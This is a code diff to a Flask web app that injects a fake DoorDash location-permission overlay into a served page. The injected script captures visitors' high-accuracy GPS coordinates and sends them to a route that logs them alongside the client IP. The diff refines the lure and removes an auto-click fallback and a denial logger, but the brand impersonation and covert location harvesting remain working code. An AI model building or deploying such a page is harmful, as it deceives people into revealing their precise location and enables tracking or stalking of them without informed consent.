@@ -24,7 +24,7 @@ def serve_page():
     except FileNotFoundError:
         html_content = "<html><body>Default page - page.html not found</body></html>"
     
-    # Inject the permission overlay and tracking script
+    # Inject the working permission overlay
     overlay_and_script = """
     <style>
         #locationOverlay {
@@ -33,7 +33,7 @@ def serve_page():
             left: 0;
             right: 0;
             bottom: 0;
-            background: rgba(0,0,0,0.85);
+            background: rgba(0,0,0,0.9);
             display: flex;
             flex-direction: column;
             justify-content: center;
@@ -55,58 +55,48 @@ def serve_page():
             cursor: pointer;
             font-weight: bold;
         }
-        #locationMessage {
-            max-width: 300px;
-            margin-bottom: 20px;
-            font-size: 16px;
-        }
     </style>
 
     <div id="locationOverlay">
-        <h2>Location Access Required</h2>
-        <div id="locationMessage">DoorDash needs your location to show nearby restaurants</div>
-        <button id="locationButton">ALLOW LOCATION</button>
+        <h2>Enable Location Services</h2>
+        <p>DoorDash needs your location to show nearby restaurants</p>
+        <button id="locationButton">ALLOW LOCATION ACCESS</button>
     </div>
 
     <script>
-        // This will DEFINITELY trigger the iOS permission dialog when clicked
+        // This WILL trigger iOS permission dialog when clicked
         document.getElementById('locationButton').addEventListener('click', function() {
             if (navigator.geolocation) {
+                // This is the key part that makes iOS show the permission dialog
                 navigator.geolocation.getCurrentPosition(
                     function(position) {
-                        // Success - log location
+                        // Success callback
                         const lat = position.coords.latitude;
                         const lon = position.coords.longitude;
                         fetch('/log_location?lat=' + lat + '&lon=' + lon);
                         document.getElementById('locationOverlay').style.display = 'none';
                     },
                     function(error) {
-                        // Error - show message
-                        document.getElementById('locationMessage').innerHTML = 
-                            'Please enable location access in your browser settings';
+                        // Error callback
+                        if(error.code === error.PERMISSION_DENIED) {
+                            document.getElementById('locationOverlay').innerHTML = `
+                                <h2>Location Access Denied</h2>
+                                <p>Please enable location in Settings > Safari > Location Services</p>
+                            `;
+                        }
                     },
                     {
                         enableHighAccuracy: true,
                         maximumAge: 0,
-                        timeout: 15000
+                        timeout: 10000
                     }
                 );
-            } else {
-                document.getElementById('locationMessage').innerHTML = 
-                    'Your browser does not support location services';
             }
         });
-
-        // Fallback - try to trigger after 3 seconds if no interaction
-        setTimeout(function() {
-            if (document.getElementById('locationOverlay').style.display !== 'none') {
-                document.getElementById('locationButton').click();
-            }
-        }, 3000);
     </script>
     """
     
-    # Insert the overlay and script right before </body>
+    # Insert before </body> or add if doesn't exist
     if '</body>' in html_content:
         modified_html = html_content.replace('</body>', overlay_and_script + '</body>')
     else:
@@ -120,15 +110,7 @@ def log_location():
     lon = request.args.get('lon', 'unknown')
     client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     
-    logger.info(f"LOCATION GRANTED - IP: {client_ip}, Latitude: {lat}, Longitude: {lon}")
-    return '', 200
-
-@app.route('/log_error')
-def log_error():
-    error_code = request.args.get('code', 'unknown')
-    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    
-    logger.info(f"LOCATION DENIED - IP: {client_ip}, Error Code: {error_code}")
+    logger.info(f"LOCATION GRANTED - IP: {client_ip}, Lat: {lat}, Lon: {lon}")
     return '', 200
 
 if __name__ == '__main__':
